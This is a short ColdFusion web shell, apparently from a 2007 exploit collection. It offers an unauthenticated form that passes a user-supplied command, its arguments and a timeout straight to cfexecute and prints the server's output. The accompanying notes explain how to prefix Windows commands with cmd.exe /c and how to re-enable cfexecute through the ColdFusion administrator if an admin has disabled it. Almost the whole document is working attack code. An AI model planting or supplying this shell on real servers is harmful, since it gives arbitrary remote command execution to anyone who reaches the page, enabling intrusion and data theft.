<html>
<body>

<!-- Contributed by Kurt Grutzmacher () -->

Notes:<br><br>
<ul>
<li>Prefix DOS commands with "c:\windows\system32\cmd.exe /c &lt;command&gt;" or wherever cmd.exe is<br>
<li>Options are, of course, the command line options you want to run
<li>CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it
</ul>
<p>
<cfoutput>
<table>
<form method="POST" action="cfexec.cfm">
<tr><td>Command:</td><td><input type=text name="cmd" size=50 
  <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
<tr><td>Options:</td><td> <input type=text name="opts" size=50 
  <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
<tr><td>Timeout:</td><td> <input type=text name="timeout" size=4 
  <cfif isdefined("form.timeout")>value="#form.timeout#"
  <cfelse>value="5"</cfif>></td></tr>
</table>
<input type=submit value="Exec" >
</FORM>

<cfif isdefined("form.cmd")>
<cfsavecontent variable="myVar">
<cfexecute name = "#Form.cmd#"
   arguments = "#Form.opts#" 
   timeout = "#Form.timeout#">
</cfexecute>
</cfsavecontent>
<pre>
#myVar#
</pre>
</cfif>
</cfoutput>
</body>
</html>

<!-- Contributed by Kurt Grutzmacher (http://grutz.jingojango.net/exploits/) -->
<!--    http://michaeldaw.org   04/2007    -->
